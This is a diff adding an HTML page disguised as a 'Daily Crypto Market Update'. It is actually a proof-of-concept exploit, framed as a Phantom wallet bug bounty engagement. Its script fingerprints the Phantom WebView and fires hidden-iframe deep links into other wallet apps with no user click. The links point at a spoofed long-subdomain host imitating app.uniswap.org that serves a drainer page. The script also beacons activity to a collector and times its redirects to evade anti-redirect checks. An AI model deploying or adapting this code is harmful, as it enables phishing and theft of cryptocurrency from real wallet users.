@@ -1,0 +1,166 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<title>Daily Crypto Market Update</title>
+<style>
+  :root { color-scheme: light dark; }
+  html,body { margin:0; padding:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
+  body { background:#0b0d12; color:#e6e8ee; padding:24px; }
+  h1 { font-size:22px; margin:0 0 8px; }
+  p  { font-size:15px; line-height:1.5; color:#a8adba; }
+  .card { background:#141826; border:1px solid #1e2437; border-radius:14px; padding:18px; margin-top:18px; }
+  .log  { font-family:ui-monospace,Menlo,Consolas,monospace; font-size:12px; color:#7f8da8; white-space:pre-wrap;
+          background:#0f1220; padding:12px; border-radius:10px; margin-top:10px; max-height:40vh; overflow:auto; }
+  .pill { display:inline-block; padding:3px 8px; border-radius:999px; font-size:11px; background:#1e2437; color:#8f9bb7; margin-right:4px; }
+  button { background:#5b6cff; color:#fff; border:0; border-radius:10px; padding:10px 14px; font-weight:600; }
+</style>
+</head>
+<body>
+
+<h1>Loading market data...</h1>
+<p>Fetching the latest prices. This should only take a moment.</p>
+
+<div class="card">
+  <div>
+    <span class="pill">phantom-ext-hijack</span>
+    <span class="pill">zero-click</span>
+    <span class="pill">bbp-phantom</span>
+  </div>
+  <div class="log" id="log">[boot] poc loaded
+[boot] waiting for DOMContentLoaded...
+</div>
+  <button id="manual">Run manually (fallback)</button>
+</div>
+
+<script>
+/* ============================================================
+ * PHANTOM WALLET — IN-APP BROWSER CROSS-APP HIJACK PoC
+ * Engagement: Bugcrowd Phantom Managed BBP (authorized)
+ * Author: 33x
+ *
+ * Goal: Demonstrate that Phantom's in-app WebView auto-processes
+ *       external app schemes fired from a hidden <iframe> with
+ *       NO user gesture, pivoting the victim into another wallet
+ *       app where a spoofed-origin drainer prompt can be shown.
+ *
+ * Stage 1 — fingerprint (is this Phantom's WebView?)
+ * Stage 2 — scheme-hop: metamask:// trust:// rainbow:// cbwallet://
+ *                       (fired from hidden iframes, staggered)
+ * Stage 3 — telemetry: which scheme resolved (visibilitychange /
+ *                      pagehide fires only if the OS switched apps)
+ * Stage 4 — optional drain-stage redirect
+ * ============================================================ */
+
+(function () {
+  "use strict";
+
+  var LOG = document.getElementById("log");
+  function log(s) {
+    var t = new Date().toISOString().substr(11, 12);
+    LOG.textContent += "[" + t + "] " + s + "\n";
+    LOG.scrollTop = LOG.scrollHeight;
+    // Also beacon to your collector so you have evidence for the report.
+    try {
+      navigator.sendBeacon(
+        "/collect",
+        JSON.stringify({ t: Date.now(), msg: s, ua: navigator.userAgent })
+      );
+    } catch (e) {}
+  }
+
+  /* --- Stage 1: fingerprint ------------------------------------------- */
+  var ua = navigator.userAgent || "";
+  var isiOS      = /iPhone|iPad|iPod/.test(ua);
+  var isAndroid  = /Android/.test(ua);
+  var isPhantom  = /Phantom/i.test(ua) ||
+                   (window.phantom && window.phantom.solana) ||
+                   (window.solana && window.solana.isPhantom);
+  log("ua=" + ua);
+  log("platform=" + (isiOS ? "ios" : isAndroid ? "android" : "other") +
+      " phantom=" + !!isPhantom);
+
+  /* --- Stage 2: build the scheme-hop payload --------------------------- *
+   * The spoofUrl uses the Long-Subdomain technique:
+   *   https://app.uniswap.org.<padding>.<attacker>/swap
+   * Many mobile address bars only show the *start* of the host, so the
+   * victim sees "app.uniswap.org" even though <attacker>.tld is the
+   * real registrable domain. This is the landing page where the drainer
+   * contract approve() prompt is surfaced to the hijacked wallet.
+   * -------------------------------------------------------------------- */
+  var ATTACKER_HOST =
+    "app.uniswap.org" +
+    ".liquidity-rewards-claim-portal-v3-mainnet-eth" +
+    ".poc.33x.dev";              // <-- REPLACE with your lab host
+  var spoofUrl = "https://" + ATTACKER_HOST + "/drain.html?src=phantom";
+
+  var targets = [
+    { name: "MetaMask",        uri: "metamask://dapp/" + spoofUrl },
+    { name: "Trust Wallet",    uri: "trust://open_url?coin_id=60&url=" + encodeURIComponent(spoofUrl) },
+    { name: "Rainbow",         uri: "rainbow://open?url=" + encodeURIComponent(spoofUrl) },
+    { name: "Coinbase Wallet", uri: "cbwallet://dapp?url=" + encodeURIComponent(spoofUrl) },
+    /* Non-wallet hops kept for cross-scheme evidence:                    */
+    { name: "Telegram probe",  uri: "tg://resolve?domain=PhantomPocBot&start=hit" },
+    { name: "Chrome hop",      uri: "googlechrome://navigate?url=" + encodeURIComponent(spoofUrl) }
+  ];
+
+  /* --- Stage 3: evidence — did the OS switch apps? -------------------- */
+  var switched = false;
+  var startTs  = 0;
+  function markSwitch(src) {
+    if (switched) return;
+    switched = true;
+    var dt = Date.now() - startTs;
+    log("[evidence] app-switch detected via " + src + " after " + dt + "ms");
+  }
+  document.addEventListener("visibilitychange", function () {
+    if (document.hidden) markSwitch("visibilitychange");
+  });
+  window.addEventListener("pagehide",  function () { markSwitch("pagehide");  });
+  window.addEventListener("blur",      function () { markSwitch("blur");      });
+
+  /* --- Stage 4: fire the hops (hidden iframes, zero-click) ------------ */
+  function fireHop(target, i) {
+    setTimeout(function () {
+      log("[hop " + i + "] " + target.name + " -> " + target.uri.slice(0, 80));
+      var f = document.createElement("iframe");
+      f.setAttribute("aria-hidden", "true");
+      f.style.cssText = "display:none;width:0;height:0;border:0;position:absolute;left:-9999px;";
+      f.src = target.uri;
+      document.body.appendChild(f);
+      // Clean up after the OS has had a chance to intercept.
+      setTimeout(function () {
+        if (f && f.parentNode) f.parentNode.removeChild(f);
+      }, 1200);
+    }, i * 700);
+  }
+
+  function runHops() {
+    if (startTs) return;
+    startTs = Date.now();
+    log("[fire] starting " + targets.length + " scheme hops");
+    targets.forEach(fireHop);
+    // Also try top-level location as last-resort hop for vendors that
+    // block iframe-origin navigation but allow top-level scheme nav.
+    setTimeout(function () {
+      if (!switched) {
+        log("[fallback] window.location = " + targets[0].name);
+        try { window.location.href = targets[0].uri; } catch (e) { log("fallback err " + e); }
+      }
+    }, targets.length * 700 + 1500);
+  }
+
+  /* Auto-run shortly after load. Delay helps dodge any Phantom
+     anti-redirect heuristic that blocks navigations fired in the first
+     few hundred ms of page load. */
+  window.addEventListener("load", function () {
+    log("[boot] load fired");
+    setTimeout(runHops, 1500);
+  });
+
+  document.getElementById("manual").addEventListener("click", runHops);
+})();
+</script>
+</body>
+</html>
